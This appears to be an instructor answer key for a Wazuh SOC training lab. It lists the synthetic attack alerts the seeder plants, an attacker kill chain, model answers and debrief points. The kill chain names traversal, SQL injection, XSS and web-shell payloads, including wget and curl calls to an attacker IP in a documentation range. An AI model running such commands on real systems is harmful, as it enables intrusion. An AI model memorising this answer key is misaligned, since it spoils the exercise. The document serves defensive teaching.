# Challenge 1 — Instructor Notes & Answer Key 🔑

> Keep this away from students. It documents exactly what the seeder plants so
> you can grade the exercise and run a debrief.

## The dataset at a glance

The seeder (`seeder/seed.py`) is **deterministic** (`random.seed(1337)`), so the
dataset is identical on every rebuild. It plants **~278 alert documents** into
the Wazuh indexer across two daily indices (`wazuh-alerts-4.x-*`), all within
the last 24 hours.

| Rule ID | Level | Description | Count | Phase |
|---|---|---|---|---|
| 31101 | 5 | Web server 400 error code | ~173 | recon + benign noise |
| 31151 | 10 | Multiple 400 error codes from same source IP | ~10 | recon (correlation) |
| 31104 | 6 | Common web attack | ~22 | path traversal |
| 31103 | 7 | SQL injection attempt | ~44 | SQLi |
| 31105 | 6 | XSS attempt | ~20 | XSS |
| 31166 | 12 | Web shell / command execution | ~9 | **compromise** |

## Cast of characters

| IP | Role | Geo (planted) |
|---|---|---|
| **203.0.113.77** | **The attacker** — full kill chain, ends in compromise | Amsterdam, NL |
| 203.0.113.9 | **Red herring** — noisy scanner, recon only, never escalates | Moscow, RU |
| 198.51.100.x | Legitimate users — only generate the occasional benign 404 | US / DE / UK |

> All IPs are from reserved documentation ranges (RFC 5737), so they are
> obviously synthetic and safe to use in training.

## The kill chain (answer to Q3 timeline)

All times relative to when the lab was started:

1. **~18h ago — Recon / forced browsing.** `203.0.113.77` with a Nikto
   user-agent hammers `/admin`, `/wp-login.php`, `/phpmyadmin/`, `/.env`,
   `/.git/config`, `/shell.php`, etc. → **120** `404`s. The volume trips the
   correlation rule **31151** (level 10) repeatedly.
2. **~17h ago — Path traversal.** `GET /download.php?file=../../../../etc/passwd`
   and encoded variants → rule **31104**, MITRE **T1083**. One request returns
   `200` (sensitive file disclosed).
3. **~16h ago — SQL injection.** `sqlmap/1.7` user-agent. `UNION SELECT`,
   boolean, and time-based payloads against `/products.php?id=` → rule **31103**,
   MITRE **T1190**. Several `UNION SELECT ... FROM users` requests return `200`
   with large response bodies → **data extraction succeeded**.
4. **~15h ago — XSS.** `<script>`, `onerror=`, and cookie-exfil payloads against
   `/search.php` and `/comment.php` → rule **31105**, MITRE **T1190**.
5. **~14h ago — Compromise.** A `POST` to a vulnerable upload endpoint
   (`/uploads/avatar_upload.php`, `200`) is followed by requests to
   `/uploads/shell.php?cmd=id`, `whoami`, `cat /etc/passwd`,
   `wget http://203.0.113.77/m.sh`, `curl .../beacon` — all `200`.
   → rule **31166** (level 12), MITRE **T1505.003** (Web Shell). **This is the
   breach.**

## Model answers

- **Q1 Triage** — 6 source IPs. Hostile: `203.0.113.77` (full chain) and
  `203.0.113.9` (scanning). Benign: the four `198.51.100.x` users (only sparse
  favicon/robots 404s, normal browser UA).
- **Q2 Attribution** — `203.0.113.77`, ~215 of the alerts, claims to originate
  from Amsterdam, Netherlands (`GeoLocation.country_name`).
- **Q3 Timeline** — see the kill chain above.
- **Q4 Techniques** — Forced browsing / scanning; Path Traversal (**T1083**);
  SQL Injection (**T1190**); XSS (**T1190**); Web Shell + command execution
  (**T1505.003**). Filter `rule.mitre.id : *` to list them.
- **Q5 Did they succeed? YES.** Pivot: `data.srcip:"203.0.113.77" and data.id:"200"`.
  Early activity is `404`/`403` (blocked); the SQLi `UNION` dumps and then the
  web-shell requests return `200`. The most severe alert is **rule 31166,
  level 12** — remote command execution via web shell = full compromise.
- **Q6 Red herring** — `203.0.113.9`. It only ever produces rule 31101 `404`s and
  never triggers SQLi/XSS/web-shell rules, and nothing it touches returns `200`.
  High noise, zero impact.

## Debrief talking points

- **Severity ≠ volume.** The scanner made lots of noise; the real damage was a
  handful of level-12 alerts. Teach students to sort by `rule.level`.
- **The `404 → 200` transition** is the clearest signal of successful
  exploitation. Watching status codes per source IP is a core hunting skill.
- **User-Agent is a tell but not proof** (`sqlmap`, `Nikto` here) — attackers
  can spoof it; corroborate with payloads in `data.url`.
- **MITRE mapping** turns raw alerts into a narrative management understands.

## Resetting the lab for a new cohort

```bash
docker compose down -v        # wipe all indexed data (volumes)
./setup.sh                    # rebuild + reseed from scratch
```

To re-seed without wiping everything, delete the marker and the alert indices:

```bash
curl -k -u admin:SecretPassword -XDELETE "https://localhost:9200/soc-lab-seed-marker"
curl -k -u admin:SecretPassword -XDELETE "https://localhost:9200/wazuh-alerts-4.x-*"
docker compose up -d wazuh.seeder
```
